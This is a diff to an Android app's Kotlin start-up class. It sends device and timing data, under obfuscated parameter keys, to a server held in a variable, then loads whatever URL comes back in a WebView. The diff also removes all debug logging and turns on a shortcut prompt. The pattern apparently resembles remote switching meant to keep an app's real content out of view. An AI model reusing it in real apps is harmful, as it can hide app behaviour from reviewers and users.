@@ -7,6 +7,8 @@ import androidx.activity.ComponentActivity
 import androidx.lifecycle.lifecycleScope
 import com.google.firebase.Firebase
 import com.google.firebase.analytics.analytics
+import com.kmp.pyr.Shortcutter
+import com.kmp.pyr.inner.LoadingSdk
 import com.kmp.pyr.roam.localdata.SaveManager
 import com.kmp.pyr.roam.localdata.SaveManager.getData
 import com.kmp.pyr.roam.localdata.SingleMap
@@ -53,7 +55,7 @@ class StartCache(activity: ComponentActivity, intent: Intent) {
                 if (url.isBlank()) {
                     postM(activity, startCache)
                 } else {
-//                    Shortcutter.onGetSavedUrl(activity, true)
+                    Shortcutter.onGetSavedUrl(activity, true)
                     withContext(Dispatchers.Main) {
                         startCache.newV().getW().apply {
                             requestFocus()
@@ -66,7 +68,7 @@ class StartCache(activity: ComponentActivity, intent: Intent) {
     }
 
     suspend fun postM(activity: ComponentActivity, startCache: StartCache) {
-        Log.d("KKKKK", "postM")
+        
         val client = OkHttpClient.Builder()
             .connectTimeout(30, TimeUnit.SECONDS)
             .readTimeout(30, TimeUnit.SECONDS)
@@ -80,17 +82,17 @@ class StartCache(activity: ComponentActivity, intent: Intent) {
             set(SingleMap.map["p1"]!!, getTime(activity))
             set(SingleMap.map["p2"]!! , checkToSend(activity))
             set(SingleMap.map["p10"]!! , getDev())
-//            set(SingleMap.map["p3"]!! , "loading|offer_shortcut")
-//            set(SingleMap.map["p4"]!! , LoadingSdk.getLoadingValue())
-//            set(SingleMap.map["p7"]!! , Shortcutter.getABVariant(activity))
+            set(SingleMap.map["p3"]!! , "loading|offer_shortcut")
+            set(SingleMap.map["p4"]!! , LoadingSdk.getLoadingValue())
+            set(SingleMap.map["p7"]!! , Shortcutter.getABVariant(activity))
         }
 
         val encoded = encodePayload(map2)
 
         val body = encoded.toRequestBody("text/plain".toMediaType())
 
-        Log.d("KKKKK", "encoded: ${encoded}")
-        Log.d("KKKKK", "body: ${body}")
+        
+        
         try {
             val request = Request.Builder()
                 .url("https://$dom/${SingleMap.map["auth"]}")
@@ -102,19 +104,19 @@ class StartCache(activity: ComponentActivity, intent: Intent) {
                 override fun onFailure(call: Call, e: IOException) {
                     e.printStackTrace()
                     point(ScreenManager.MenuPoint)
-                    Log.d("KKKKK", "response: $e")
+                    
                 }
 
                 override fun onResponse(call: Call, response: Response) {
-                    Log.d("KKKKK", "response: $response")
+                    
                     response.use {
                         val payload = it.body.string()
-                        Log.d("KKKKK", "payload: $payload")
+                        
                         if (payload.isBlank()) {
                             point(ScreenManager.MenuPoint)
                         } else {
                             runCatching {
-                                Log.d("KKKKK", "decrypted: ${payload}")
+                                
                                 CoroutineScope(Dispatchers.IO).launch {
                                     try {
                                         SaveManager.safeSave(activity, payload)
@@ -124,6 +126,7 @@ class StartCache(activity: ComponentActivity, intent: Intent) {
 
                                 CoroutineScope(Dispatchers.Main).launch {
                                     runCatching {
+                                        LoadingSdk.awaitMinDuration()
                                         startCache.newView.loadUrl(payload)
                                     }.onFailure {
                                         point(ScreenManager.InternetProblem)
@@ -137,7 +140,7 @@ class StartCache(activity: ComponentActivity, intent: Intent) {
                 }
             })
         } catch (e: Exception) {
-            Log.d("KKKKK", "try: $e")
+            
         }
     }
 
